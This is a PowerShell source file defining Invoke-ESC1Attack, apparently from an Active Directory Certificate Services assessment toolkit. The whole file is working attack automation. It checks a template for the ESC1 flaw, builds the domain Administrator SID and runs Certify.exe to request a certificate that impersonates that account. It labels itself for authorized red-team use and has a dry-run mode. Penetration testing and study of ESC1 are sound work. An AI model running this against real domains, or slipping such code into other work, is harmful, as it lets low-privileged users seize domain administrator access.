function Invoke-ESC1Attack {
    <#
        .SYNOPSIS
        Performs an ESC1 attack by requesting a certificate with Administrator SAN using Certify.exe.

        .DESCRIPTION
        This function executes an ESC1 (SAN Spoofing) attack against a vulnerable certificate template.
        It uses Certify.exe to request a certificate from the specified template while spoofing the 
        Subject Alternative Name (SAN) to impersonate the local Administrator account (RID 500).
        
        ESC1 attacks exploit templates that:
        1. Allow SAN specification (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set)
        2. Have Client Authentication EKU enabled
        3. Allow low-privileged users to enroll
        4. Do not require manager approval or authorized signatures

        .PARAMETER TemplateObject
        A DirectoryEntry object representing a certificate template (pKICertificateTemplate) that
        is vulnerable to ESC1 attacks. The template should allow SAN specification and have appropriate
        EKUs configured.

        .PARAMETER CertificateAuthority
        The Certificate Authority to request the certificate from. If not specified, attempts to
        auto-discover available CAs. Format: "CA-SERVER\CA-NAME"

        .PARAMETER CertifyPath
        Path to Certify.exe executable. If not specified, assumes Certify.exe is in the Binaries
        folder (.\Binaries\Certify.exe).

        .PARAMETER OutputPath
        Directory where certificate files (.pfx) will be saved. Defaults to current directory.

        .PARAMETER AdministratorSID
        The SID of the Administrator account to impersonate. If not specified, automatically
        discovers the local Administrator account (RID 500) SID.

        .PARAMETER WhatIf
        Shows what attack would be performed without actually executing Certify.exe.

        .INPUTS
        System.DirectoryServices.DirectoryEntry
        Certificate template DirectoryEntry objects vulnerable to ESC1.

        .OUTPUTS
        PSCustomObject
        Returns attack result with certificate details, file paths, and execution status.

        .EXAMPLE
        # Attack a vulnerable template
        $VulnTemplate = Get-AdcsObjects | Where-Object { $_.Properties['name'].Value -eq 'VulnTemplate' }
        Invoke-ESC1Attack -TemplateObject $VulnTemplate

        .EXAMPLE
        # Attack with specific CA and output path
        $Template = Get-AdcsObjects | Where-Object { $_.Properties['name'].Value -eq 'User' }
        Invoke-ESC1Attack -TemplateObject $Template -CertificateAuthority "DC01\horse-DC01-CA" -OutputPath "C:\Temp"

        .EXAMPLE
        # Use with pipeline from ConvertTo-ESC1
        $ESC4Issue | ConvertTo-ESC1 -PassThru | Invoke-ESC1Attack

        .NOTES
        WARNING: This function performs actual certificate attacks that can compromise security.
        Only use in authorized penetration testing or red team exercises.
        
        Requires:
        - Certify.exe (https://github.com/GhostPack/Certify/releases) placed in .\Binaries\ folder
        - Network access to Certificate Authority
        - Appropriate permissions to enroll certificates
        
        Download Certify.exe and place it in the Binaries folder before using this function.

        .LINK
        https://posts.specterops.io/certified-pre-owned-d95910965cd2
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [ValidateNotNull()]
        [System.DirectoryServices.DirectoryEntry]$TemplateObject,
        
        [Parameter()]
        [string]$CertificateAuthority,
        
        [Parameter()]
        [string]$CertifyPath = ".\Binaries\Certify.exe",
        
        [Parameter()]
        [string]$OutputPath = ".",
        
        [Parameter()]
        [string]$AdministratorSID
    )

    #requires -Version 5

    begin {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
        
        # Validate Certify.exe exists - check multiple possible locations
        if (-not (Test-Path -Path $CertifyPath)) {
            Write-Warning "Certify.exe not found at specified path: $CertifyPath"
            
            # Try common alternative locations
            $alternativePaths = @(
                ".\Binaries\Certify.exe",
                ".\Tools\Certify.exe", 
                ".\Certify.exe",
                "C:\Tools\Certify.exe"
            )
            
            $foundPath = $null
            foreach ($altPath in $alternativePaths) {
                if (Test-Path -Path $altPath) {
                    $foundPath = $altPath
                    break
                }
            }
            
            if ($foundPath) {
                $CertifyPath = $foundPath
                Write-Verbose "Found Certify.exe at alternative location: $CertifyPath"
            } else {
                throw "Certify.exe not found in any expected location. Please download Certify.exe from https://github.com/GhostPack/Certify/releases and place it in the Binaries folder."
            }
        }
        
        # Validate output directory exists or create it
        if (-not (Test-Path -Path $OutputPath)) {
            try {
                New-Item -Path $OutputPath -ItemType Directory -Force | Out-Null
                Write-Verbose "Created output directory: $OutputPath"
            } catch {
                throw "Failed to create output directory: $OutputPath. Error: $($_.Exception.Message)"
            }
        }
        
        # Get domain information for SID construction
        $domainSid = $null
        try {
            $domain = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Domain
            
            # Get domain SID using DirectoryEntry
            $rootDSE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
            $defaultNC = $rootDSE.Properties["defaultNamingContext"].Value
            $domainEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$defaultNC")
            
            # Get domain SID from objectSid attribute
            if ($domainEntry.Properties["objectSid"].Value) {
                $domainSidBytes = $domainEntry.Properties["objectSid"].Value
                $domainSidObject = New-Object System.Security.Principal.SecurityIdentifier($domainSidBytes, 0)
                $domainSid = $domainSidObject.Value
            }
            
            Write-Verbose "Domain: $domain, Domain SID: $domainSid"
        } catch {
            Write-Warning "Could not retrieve domain information: $($_.Exception.Message)"
        }
    }

    process {
        # Validate input is a certificate template
        if ($TemplateObject.SchemaClassName -ne 'pKICertificateTemplate') {
            Write-Error "Input object is not a certificate template. SchemaClassName: $($TemplateObject.SchemaClassName)"
            return [PSCustomObject]@{
                Success = $false
                TemplateName = $TemplateObject.Properties['name'].Value
                Error = "Invalid input: Not a certificate template"
                CertificatePath = $null
                CertifyOutput = $null
            }
        }
        
        $templateName = $TemplateObject.Properties['name'].Value
        Write-Verbose "Processing certificate template: $templateName"
        
        # Validate template is ESC1 vulnerable
        $nameFlags = [int]$TemplateObject.Properties['msPKI-Certificate-Name-Flag'].Value
        $enrollmentFlags = [int]$TemplateObject.Properties['msPKI-Enrollment-Flag'].Value
        $ekus = $TemplateObject.Properties['pKIExtendedKeyUsage'].Value
        
        $sanEnabled = ($nameFlags -band 0x1) -eq 0x1  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
        $pendingDisabled = ($enrollmentFlags -band 0x2) -eq 0  # CT_FLAG_PEND_ALL_REQUESTS not set
        $clientAuthEnabled = $ekus -contains "1.3.6.1.5.5.7.3.2"  # Client Authentication EKU
        
        if (-not $sanEnabled) {
            Write-Warning "Template '$templateName' does not allow SAN specification (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT not set)"
        }
        
        if (-not $clientAuthEnabled) {
            Write-Warning "Template '$templateName' does not have Client Authentication EKU enabled"
        }
        
        if (-not $pendingDisabled) {
            Write-Warning "Template '$templateName' requires manager approval (CT_FLAG_PEND_ALL_REQUESTS set)"
        }
        
        # Determine Administrator SID if not provided
        if (-not $AdministratorSID) {
            try {
                # Construct Administrator SID (Domain SID + RID 500)
                if ($domainSid) {
                    $AdministratorSID = "$domainSid-500"
                    Write-Verbose "Constructed Administrator SID: $AdministratorSID"
                } else {
                    # Fallback: try to find Administrator account directly
                    $adminUser = Get-WmiObject -Class Win32_UserAccount -Filter "SID LIKE '%-500'"
                    if ($adminUser) {
                        $AdministratorSID = $adminUser.SID
                        Write-Verbose "Found Administrator SID via WMI: $AdministratorSID"
                    } else {
                        throw "Could not determine Administrator SID"
                    }
                }
            } catch {
                Write-Error "Failed to determine Administrator SID: $($_.Exception.Message)"
                return [PSCustomObject]@{
                    Success = $false
                    TemplateName = $templateName
                    Error = "Could not determine Administrator SID"
                    CertificatePath = $null
                    CertifyOutput = $null
                }
            }
        }
        
        # Auto-discover Certificate Authority if not provided
        if (-not $CertificateAuthority) {
            try {
                Write-Verbose "Auto-discovering Certificate Authority..."
                
                # First try using Get-CAFullName with ADCS objects
                try {
                    $adcsObjects = Get-AdcsObjects
                    $caObjects = $adcsObjects | Where-Object { $_.SchemaClassName -eq 'pKIEnrollmentService' }
                    if ($caObjects) {
                        $caFullName = Get-CAFullName -CAObjects $caObjects
                        if ($caFullName) {
                            if ($caFullName -is [string]) {
                                $CertificateAuthority = $caFullName
                            } else {
                                # Multiple CAs found, use the first one
                                $CertificateAuthority = $caFullName[0]
                                Write-Warning "Multiple CAs found, using first: $CertificateAuthority"
                            }
                            Write-Verbose "Discovered CA via ADCS objects: $CertificateAuthority"
                        }
                    }
                } catch {
                    Write-Verbose "Failed to discover CA via ADCS objects: $($_.Exception.Message)"
                }
                
                # Fallback to Certify.exe enum-cas if ADCS method failed
                if (-not $CertificateAuthority) {
                    $certifyDiscovery = & $CertifyPath enum-cas /quiet 2>&1
                    $caMatch = [regex]::Match($certifyDiscovery, "FullName\s*:\s*(.*?$)")
                    if ($caMatch.Success) {
                        $CertificateAuthority = $caMatch.Groups[1].Value.Trim()
                        Write-Verbose "Discovered CA via Certify.exe: $CertificateAuthority"
                    }
                }
                
                if (-not $CertificateAuthority) {
                    throw "Could not auto-discover Certificate Authority using either method"
                }
                
            } catch {
                Write-Error "Failed to discover Certificate Authority: $($_.Exception.Message)"
                return [PSCustomObject]@{
                    Success = $false
                    TemplateName = $templateName
                    Error = "Could not discover Certificate Authority"
                    CertificatePath = $null
                    CertifyOutput = $null
                }
            }
        }
        
        # Construct certificate file path
        $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
        $certFileName = "ESC1-$templateName-$timestamp.out"
        $certFilePath = Join-Path -Path $OutputPath -ChildPath $certFileName
        
        # Build Certify.exe command arguments
        $certifyArgs = @(
            "request"
            "--ca"
            $CertificateAuthority
            "--template"
            $templateName
            "--sid"
            $AdministratorSID
            "--out-file"
            $certFilePath
        )
        
        Write-Verbose "Certify command: $CertifyPath $($certifyArgs -join ' ')"
        
        # Execute the attack
        if ($PSCmdlet.ShouldProcess("Template: $templateName", "ESC1 Attack - Request certificate with Administrator SAN")) {
            try {
                Write-Warning "Executing ESC1 attack against template '$templateName'"
                Write-Warning "Requesting certificate with Administrator SAN: $AdministratorSID"
                
                $certifyOutput = & $CertifyPath $certifyArgs 2>&1
                $exitCode = $LASTEXITCODE
                
                Write-Verbose "Certify.exe exit code: $exitCode"
                Write-Verbose "Certify.exe output: $certifyOutput"
                
                if ($exitCode -eq 0 -and (Test-Path -Path $certFilePath)) {
                    Write-Host "[+] ESC1 attack successful!" -ForegroundColor Green
                    Write-Host "[i] Certificate saved to: $certFilePath" -ForegroundColor Cyan
                    
                    # Read certificate file and find the longest line
                    try {
                        $certFileLines = Get-Content -Path $certFilePath
                        $certificate = $certFileLines | Sort-Object { $_.Length } -Descending | Select-Object -First 1
                        Write-Verbose "Certificate (longest line): $($certificate.Substring(0, [Math]::Min(50, $certificate.Length)))..."
                    } catch {
                        Write-Warning "Failed to read certificate from file: $($_.Exception.Message)"
                        $certificate = $null
                    }
                    
                    return [PSCustomObject]@{
                        Success = $true
                        TemplateName = $templateName
                        CertificatePath = $certFilePath
                        AdministratorSID = $AdministratorSID
                        CertificateAuthority = $CertificateAuthority
                        CertifyOutput = $certifyOutput -join "`n"
                        ExitCode = $exitCode
                        Error = $null
                    }
                } else {
                    throw "Certify.exe failed with exit code $exitCode. Output: $($certifyOutput -join "`n")"
                }
                
            } catch {
                Write-Error "ESC1 attack failed: $($_.Exception.Message)"
                return [PSCustomObject]@{
                    Success = $false
                    TemplateName = $templateName
                    Error = $_.Exception.Message
                    CertificatePath = $certFilePath
                    CertifyOutput = if ($certifyOutput) { $certifyOutput -join "`n" } else { $null }
                    ExitCode = if ($exitCode) { $exitCode } else { $null }
                }
            }
        } else {
            # WhatIf mode
            Write-Host "What if: Would execute ESC1 attack against template '$templateName'" -ForegroundColor Yellow
            Write-Host "What if: Would request certificate with Administrator SAN: $AdministratorSID" -ForegroundColor Yellow
            Write-Host "What if: Would save certificate to: $certFilePath" -ForegroundColor Yellow
            Write-Host "What if: Certify command: $CertifyPath $($certifyArgs -join ' ')" -ForegroundColor Yellow
            
            return [PSCustomObject]@{
                Success = $true
                TemplateName = $templateName
                CertificatePath = $certFilePath
                AdministratorSID = $AdministratorSID
                CertificateAuthority = $CertificateAuthority
                CertifyOutput = "WhatIf mode - attack not executed"
                ExitCode = 0
                Error = $null
            }
        }

    }

    end {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
    }
}
